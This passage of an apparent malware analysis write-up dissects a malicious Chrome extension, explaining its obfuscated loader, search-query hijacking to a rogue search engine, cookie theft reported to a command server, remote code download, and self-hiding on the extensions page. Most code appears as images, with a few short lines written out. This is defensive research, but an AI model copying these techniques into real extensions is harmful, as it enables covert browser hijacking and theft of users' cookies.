style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg37.a402801c.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg37.a402801c.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg37.a402801c.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%2781%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg38.60ae55a5.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg38.60ae55a5.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg38.60ae55a5.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>Config.js sets parameters such as the API domain (C2) and the extension IDs.</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27131%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg39.5c8ea56a.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg39.5c8ea56a.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg39.5c8ea56a.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><h3 id="bg.js" class="subtitle1 subtitle1_bold">bg.js</h3><p>Bg.js is the script that will consistently run in the background, and as can be seen, it is heavily obfuscated. Its purpose is to be the loader of the main script. It also prevents access to the page of the extension at chrome://extensions and removes the local extension name from the grid of extensions.</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27278%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg40.ae778f13.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg40.ae778f13.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg40.ae778f13.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>Some obfuscation has never stopped us, so we managed to deobfuscate it. By clearing redundant variables and rebuilding the deobfuscation logic that used a function with a bank of strings, we achieved a clean clear version of the code.</p><p>Instead of: _0x95cf63[_0x230891(0x107)](_0x144921)[_0x230891(0x10f)]<br/>we can get: chrome[‘runtime’].onMessage.addListener</p><p>The same logic is applied to all of the obfuscated JS scripts in the extension.</p><h3 id="bg_fallback.js" class="subtitle1 subtitle1_bold">bg_fallback.js</h3><p>Bg_fallback.js is very similar to rc.js and is also an obfuscated script. In most cases, it is not marked as malicious:</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27276%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg41.89392b0a.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg41.89392b0a.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg41.89392b0a.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27277%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg42.cad9a004.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg42.cad9a004.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg42.cad9a004.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>Bg_fallback’s purpose is to hijack user search queries from major search engines and execute them through the adversary’s search engine, as can be seen below in more detail:</p><p>Bg_fallback registers all outgoing requests to alter them before they are sent and filters them according to the URL domain.</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27142%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg43.5e5f947a.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg43.5e5f947a.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg43.5e5f947a.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>It then grabs the search term from the URL and records which search engine it came from. It then adds all information to the URL that it sends back to itself:</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27360%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg44.36033d4b.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg44.36033d4b.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg44.36033d4b.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>Finally, it gets the “timers” from the storage key and decrypts the JSON. For each of them that are not excluded, it sets a timer which it fixes in the storage and redirects the URL back to the redirect URL. Before redirecting, however, it uses “chrome.webRequest.onBeforeRedirect.addListener” to push the headers that it got from the C2.</p><pre class="styles_Article-Code__V7O9i">chrome[&#x27;runtime&#x27;].onMessage.addListener(...    if (message.msg == getRegData)</pre><p>It registers a listener to wait for the message “getRegData” to report back to the C2 on successful actions, sends cookies of specific domains to the C2, and gets information stored in the storage key “regData”.</p><p>After this, it contacts the “apiDomain” which is “securedatacorner” on “apiDomain/jobs” to get encrypted jobs from the C2. It uses its decrypt function and parses the JSON output and iterates on each job to either:</p><p>Update the redirects (save them in storage key “red” as an encrypted JSON and then report the C2 with the “jobCompleted” function) or do a validation check by getting the cookies on the domain provided on the job, and report it back to the C2 with the “jobCompleted” function.</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27151%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg45.6b2a30bc.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg45.6b2a30bc.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg45.6b2a30bc.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>List of search engines it hijacks from:<ul><li>search.myway.com</li><li>www.ask.com</li><li>www.bing.com/search</li><li>www.google.com, www.google.fr, www.google.de, www.google.no, www.google.se, www.google.nl, www.google.ca, www.google.ch, www.google.au</li></ul></p><h3 id="rc.js" class="subtitle1 subtitle1_bold">rc.js</h3><p>We are fairly confident that rc.js stands for ‘remote code’, as it downloads the script from a remote server:</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27140%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg46.ec445970.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg46.ec445970.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg46.ec445970.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27301%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg47.5d2d4f75.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg47.5d2d4f75.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg47.5d2d4f75.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>Reporting back to C2 on completion of jobs</p><p>Hijacking the search from known search engines, and redirecting it to its own “activesearchbar[.me]”, along with extra parameters including from which search engine it originated and which of its scripts (bg_fallback or rc) is executing it: (in this example hijacking from “search.myway.com”, and in the next example, hijacking from Google):</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27173%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg48.4209fffe.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg48.4209fffe.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg48.4209fffe.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%2765%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg49.4fa20119.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg49.4fa20119.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg49.4fa20119.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>Extensions_page.css<br/>The design of the page is set to be hidden:</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27247%27%20height=%2784%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg50.482455de.png&amp;w=256&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg50.482455de.png&amp;w=576&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg50.482455de.png&amp;w=576&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>Extension_page.js:</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27281%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg51.f9ffe3b3.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg51.f9ffe3b3.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg51.f9ffe3b3.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>Deobfuscated:</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27143%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg52.633f0d66.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg52.633f0d66.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg52.633f0d66.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>The script removes extensions with specific IDs from the page of the installed extensions, hiding them from the user’s eyes, and making it impossible to manually remove them.</p><p>Content.js:<br/>chrome.runtime.sendMessage(<!-- -->{action: &quot;pageView&quot;, data:window.location.hostname}<!-- -->);</p><p>background.html:</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27198%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg53.7ae4ad9f.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg53.7ae4ad9f.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg53.7ae4ad9f.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>Loads all of the above scripts to execute in the background.</p><p>Devtools.html:<br/>Loads “Devtool.js” script.</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%2750%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" 